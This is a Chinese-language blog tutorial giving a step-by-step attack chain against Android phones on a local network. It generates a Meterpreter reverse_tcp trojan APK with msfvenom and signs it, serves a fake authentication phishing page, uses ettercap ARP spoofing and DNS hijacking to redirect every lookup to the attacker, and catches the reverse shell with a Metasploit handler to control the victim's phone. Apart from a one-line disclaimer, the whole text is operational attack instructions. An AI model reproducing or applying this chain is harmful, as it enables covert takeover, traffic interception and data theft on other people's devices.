---
#标题
title: "通过ARP欺骗+DNS劫持内网准备钓鱼网页诱导下载安装Android木马再通过MSF利用Android木马渗透手机（超详细）"
#副标题
description: 
#日期
date: 2022-02-16
#封面图片
image: shinobu-kocho-de-kimetsu-no-yaiba.jpg
#协议信息，可以设置false
license: 
#优先级
weight:  
#隐藏文章，默认false
hidden: 
#分类
categories:
    - 教程
    - 渗透
    - 系统安全
#标签
tags:
    - Android
    - msf
    - 渗透
    - 信息安全
    - kali
#显示 / 隐藏目录，默认true
toc: true
#最后修改时间
lastmod:
---

>前言：仅做技术交流，互联网非法外之地，请勿不正当使用

kali IP：		192.168.0.109（因为通过虚拟机实现所以请将网卡设置为桥接）
Android IP ：192.168.0.106（其实这里在手机上设置静态IP，因为在实验中发现当攻击发生时DHCP会重新分配IP）

## 前期准备：一个带木马后门的Apk，一个钓鱼网页
（在这里有两种生成带木马的Apk方案，一种就是直接生成一个木马Apk,第二种就是可以将生成的木马Apk注入到一个没有木马的Apk中来达到伪装的目的，这里为了方便采用第一个方法，直接生成一个木马Apk来使用）

## 第一步：生成Android木马
### 1.查看一下攻击机的IP地址

    ip a

![](https://img-blog.csdnimg.cn/20210529151736957.png)

### 2.msfvenom生成Android木马

    msfvenom -p android/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=监听端口 R > /放置的目录/文件名.apk

![](https://img-blog.csdnimg.cn/20210529151758538.png)

生成的Apk文件并不能直接使用，我们还要对Apk文件进行优化对齐然后签名。需要用到的软件有三个，zipalign,、keytool 、 apksigner（如果没有请安装）。

### 3.使用zipalign对apk进行对齐

    zipalign -v 4 源文件 对齐后生成文件
 
![](https://img-blog.csdnimg.cn/20210529151833244.png)

### 4. keytool生成密钥对

    keytool -genkey -v -keystore 生成的密钥库名 -alias 密钥别名 -keyalg RSA(加密类型) -keysize 密钥长度 -validity 有效天数

>注意：当它最后询问填写的信息是否正确的时候请输入 `y` 不然它会让你重来哦！
 
![](https://img-blog.csdnimg.cn/2021052915184790.png)

### 5. apksigner对Apk进行签名

    apksigner sign --ks 密钥库名 --ks-key-alias 密钥别名 已经对齐后的文件

（密钥为在生成密钥对时设置的密钥，这里直接对对齐后的文件进行签名不生成新的签名后文件）
 
![](https://img-blog.csdnimg.cn/20210529151908189.png)

### 6. apksigner 验证Apk签名

    apksigner verify -v --print-certs 签名后的Apk
 
![](https://img-blog.csdnimg.cn/2021052915192915.png)

## 第二步：准备一个钓鱼页面

>这里伪装成一个网页认证页面

 ![](https://img-blog.csdnimg.cn/20210529151940664.png)


### 2.将准备好的钓鱼页面放到 /var/www/html/ 目录下（根据http服务器设置路径而定），然后启动Apache2
 ![](https://img-blog.csdnimg.cn/20210529151950379.png)


## 第三步：开启ARP欺骗和DNS劫持
编辑ettercap的DNS文件(（将全部解析地址指向攻击机即可）

    vim /etc/ettercap/etter.dns

 ![](https://img-blog.csdnimg.cn/20210529151958540.png)


### 2. 启动ettercap

    ettercap -G

![](https://img-blog.csdnimg.cn/2021052915222449.png)

>网卡一般默认选择eth0确认即可

 ![](https://img-blog.csdnimg.cn/20210529152234705.png)


### 3.点击搜索按钮进行主机发现
 
![](https://img-blog.csdnimg.cn/20210529152244949.png)

### 4.查看主机列表`Host List`
 ![](https://img-blog.csdnimg.cn/20210529152256931.png)


### 5. 将想要欺骗的网关和目标机分别添加到 `Add to Target 1` 和 `Add to Target 2`
 ![](https://img-blog.csdnimg.cn/20210529152305316.png)


### 6.开始ARP欺骗
 ![](https://img-blog.csdnimg.cn/20210529152312945.png)


### 7.默认选择 `sniff remote connections` ，再点击 `OK` , ettercap就会自动开始ARP欺骗
 ![](https://img-blog.csdnimg.cn/20210529152321565.png)


### 8.在开启ARP欺骗后再继续开启 `dns_spoof `进行DNS劫持操作
点开插件 `Plugins`
 
![](https://img-blog.csdnimg.cn/20210529152331736.png)

### 9.再点开插件菜单`Manage the plugins`
 ![](https://img-blog.csdnimg.cn/20210529152340314.png)


### 10.双击插件`dns_spoof`，可以看见下面的显示已经启用`dns_spoof`这个插件
 ![](https://img-blog.csdnimg.cn/20210529152350871.png)


当手机端上网的时候，可以看见手机的网址被全部解析到我们设置好的攻击机地址,表示劫持成功
 ![](https://img-blog.csdnimg.cn/20210529152424770.png)

手机端目前是无法连接到互联网的，并且访问的任何网页都会解析到我们的攻击机地址
![](https://img-blog.csdnimg.cn/20210529153453365.jpg)


## 第四步：启动MSF进行监听等待目标上线 
 
![](https://img-blog.csdnimg.cn/20210529152438101.png)

### 2.终端启动msfconsole后设置好相关的模块、载荷、反弹地址和端口，开始监听等待目上线
```
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set lhost	192.168.0.109 	//kali 本机的ip
set lport	8888  			//监听上线的端口 需要与生成木马的时候填写一样
exploit（run）   			//执行监听
```

![](https://img-blog.csdnimg.cn/20210529152456218.png)


### 3.目标安装了木马Apk点击后，攻击机的监听就会马上监听到并且渗透目标机器
>渗透后可以关闭DNS劫持使目标机恢复上网 

![](https://img-blog.csdnimg.cn/20210529152509533.png)


### 4.使用木马控制对方手机
 ![](https://img-blog.csdnimg.cn/20210529152516575.png)

